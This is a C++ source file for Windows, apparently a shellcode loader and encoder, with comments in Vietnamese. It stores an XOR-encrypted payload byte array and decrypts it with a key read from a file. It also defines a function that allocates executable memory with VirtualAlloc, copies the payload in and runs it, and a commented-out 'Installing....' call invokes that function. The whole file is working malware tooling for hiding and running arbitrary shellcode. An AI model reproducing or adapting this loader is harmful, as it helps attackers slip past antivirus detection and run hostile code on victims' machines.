#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <cctype>

//  HAM XOR
char *xorEncryption(const char *data, int dataSize, const char *key, int keySize);
//  DOC MA HEX TU FILE
char *readHexFromFile(const std::string &fileName, size_t &size);
//  DOC TU FILE
char *readFile(const std::string &filename);
//  EXECUTE PAYLOAD
bool executeHexPayload(const char *hexPayload, size_t payloadSize);
//  IN
void printCharArray(const char *array, size_t size);

int main()
{
    // XOR key
    std::string input = "Generated_key.txt";
    const char *xorKey = readFile(input);
    const int keySize = strlen(xorKey);

    const char encryptedHexPayload[] = {
        "\x93\x3F\xEA\xA1\x9D\xDD\xBB\x54\x35\x35\x31\x1E\x2C\x3E"
        "\x15\x2C\x5E\xA5\x38\x20\x25\xBE\x25\x34\x63\x7D\xFB\x1D"
        "\x75\x26\xCC\x36\x4F\x3F\xE2\x37\x3D\x78\x46\x9D\x7D\x3A"
        "\xC7\x05\x27\x26\x76\xA4\xC3\x4B\x08\x39\x6F\x19\x57\x15"
        "\xF4\xFC\x7D\x0E\x6C\xAF\xA5\x89\x3D\x3F\xE2\x17\x4D\x74"
        "\x26\xDF\x77\x09\x38\x4E\xBD\x08\xC6\x1C\x77\x7C\x6B\x4A"
        "\xE8\x47\x77\x54\x35\xBE\xF0\xC7\x6D\x6E\x47\x2C\xEA\xB7"
        "\x1D\x22\x25\x34\xA7\x10\xBE\x75\x50\xC4\x25\x76\x17\x2D"
        "\x6E\xA7\x8A\x13\x25\xCA\xBE\x19\x04\xFC\x31\xC4\x59\xE6"
        "\x0F\x65\xB9\x3F\x58\x85\x2C\xF4\xBE\x59\x99\x74\x71\x8E"
        "\x55\x8E\x32\x95\x23\x74\x25\x61\x65\x70\x4E\x85\x40\xED"
        "\x28\x0B\xE6\x2E\x63\x2D\x6E\xA7\x0F\x04\xE6\x39\x3F\x10"
        "\xBE\x75\x6C\x06\x6C\xBE\x06\xEF\x6B\xFF\x21\x44\xBD\x74"
        "\x2F\x15\x6D\x6B\x29\x15\x2C\x36\x06\x3D\x2E\x2D\x21\xC6"
        "\x81\x15\x36\x06\xCA\xD5\x28\x0E\x34\x34\x0F\xEF\x7D\x9E"
        "\x22\xBA\x92\xCA\x2A\x1D\x8B\x42\x03\x7D\x32\x5D\x75\x64"
        "\x6F\x36\x3F\x0C\xE4\xD3\x3F\xD5\xD9\x95\x71\x4F\x6D\x27"
        "\xCE\x81\x26\xCB\x6B\x45\x7C\x69\xB7\xFC\x30\xB1\x31\x1B"
        "\x24\xE7\xA3\x28\xE6\x86\x28\xFF\x21\x42\x51\x53\xCA\xE0"
        "\x3C\xC6\x87\x06\x46\x65\x6F\x77\x30\x04\xD7\x1C\xF7\x3F"
        "\x35\xCA\xA5\x25\x67\x2F\x19\x34\x3F\x3A\x58\x8C\x20\x04"
        "\xB7\x1C\xCA\xF5\x38\xC6\xAF\x26\xB8\xA4\x27\xFE\xA8\x04"
        "\xD7\xDF\x78\x8B\xD5\xCA\xA5\x07\xE4\xA9\x2D\x74\x2E\x2F"
        "\x25\xCC\x8F\x7D\xFE\xAD\x74\x8F\xE9\xEA\x19\x0F\xB8\xB1"
        "\xEA\xB7\x1D\x4F\x24\xCA\xB9\x21\xD0\xDD\xE3\x4F\x6D\x6E"
        "\x0F\xE7\x83\x67\x21\xCC\x8F\x78\x46\x9D\x5F\x31\x31\x17"
        "\x25\xE7\xBE\x25\xD5\x75\xB0\x8D\x32\xCA\xA2\xD7\xCD\x35"
        "\x0E\x1A\x25\xED\x83\x44\x31\xFE\x9F\x2F\x2D\x74\x2E\x3C"
        "\x35\x25\x70\x4F\x2C\x36\x0F\xED\x9D\x3F\x58\x8C\x2C\x8F"
        "\x2F\xF0\x66\xD0\x8F\x9A\x25\xE7\x84\x2D\xE6\xB0\x24\x74"
        "\xA4\x7C\xFE\xA4\x7D\xBC\xAA\x07\xE4\x97\x06\xDE\x6D\xAE"
        "\xA1\x1A\x92\xE0\xF4\xAC\x35\x48\x58\x17\x2C\x39\x1E\x0C"
        "\x6F\x37\x69\x45\x2C\x6D\x1D\x54\x6F\x74\xCA\x44\x42\x61"
        "\x77\x9B\xBA\x20\x30\x04\xD7\x40\x19\x19\x54\xCA\xA5\x06"
        "\x92\xA0\xAE\x58\x90\x88\x96\x0D\x6C\xF6\x3F\x7D\xF3\x7D"
        "\xF5\xB9\x18\xDA\x06\x9B\x88\x2F\x03\x45\x34\x7C\xB0\x96"
        "\xC5\x80\xD2\x19\x92\xBB\x47"};

    char *decryptedPayload = xorEncryption(encryptedHexPayload, sizeof(encryptedHexPayload), xorKey, keySize);
    printCharArray(decryptedPayload, sizeof(encryptedHexPayload));

    // std::cout << "Installing...." << std::endl;

    // bool isExecuted = executeHexPayload(encryptedHexPayload, sizeof(encryptedHexPayload));
    // if (isExecuted)
    // {
    //     std::cout << "Executed" << std::endl;
    // }
    // else
    // {
    //     std::cout << "Failed to executed" << std::endl;
    // }

    return 0;
}

char *xorEncryption(const char *data, int dataSize, const char *key, int keySize)
{
    char *encryptedData = new char[dataSize];
    for (int i = 0; i < dataSize; ++i)
    {
        encryptedData[i] = data[i] ^ key[i % keySize];
    }
    return encryptedData;
}

char *readHexFromFile(const std::string &fileName, size_t &size)
{
    std::ifstream file(fileName, std::ios::binary);

    if (!file)
    {
        std::cerr << "Failed to open file: " << fileName << std::endl;
        return nullptr;
    }

    std::stringstream buffer;
    buffer << file.rdbuf();

    size = buffer.str().size();

    char *hexData = new char[size + 1]; // Add 1 for the null terminator

    buffer.read(hexData, size);

    file.close();

    hexData[size] = '\0';

    return hexData;
}

bool executeHexPayload(const char *hexPayload, size_t payloadSize)
{
    // Allocate executable memory
    void *execMemory = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == nullptr)
    {
        std::cerr << "Failed to allocate executable memory. Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Copy the hex payload into the allocated memory
    memcpy(execMemory, hexPayload, payloadSize);

    // Cast the memory address to a function pointer and call the function
    void (*payloadFunction)() = reinterpret_cast<void (*)()>(execMemory);
    payloadFunction();

    // Free the allocated memory
    VirtualFree(execMemory, 0, MEM_RELEASE);
    return true;
}

void printCharArray(const char *array, size_t size)
{
    printf("const char decryptedHexPayload[] = {\n\t\"");
    for (size_t i = 0; i < size; ++i)
    {
        printf("\\x%02X", (unsigned char)array[i]);
        if (i != size - 1)
        {
            if ((i + 1) % 14 == 0)
            {
                printf("\"\n\t\"");
            }
            else
            {
                printf("");
            }
        }
    }
    printf("\"\n};\n");
}

char *readFile(const std::string &filename)
{
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        std::cerr << "Error opening file: " << filename << std::endl;
        return nullptr;
    }

    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char *buffer = new char[fileSize];
    if (!buffer)
    {
        std::cerr << "Error allocating memory for file content." << std::endl;
        return nullptr;
    }

    file.read(buffer, fileSize);
    file.close();

    return buffer;
}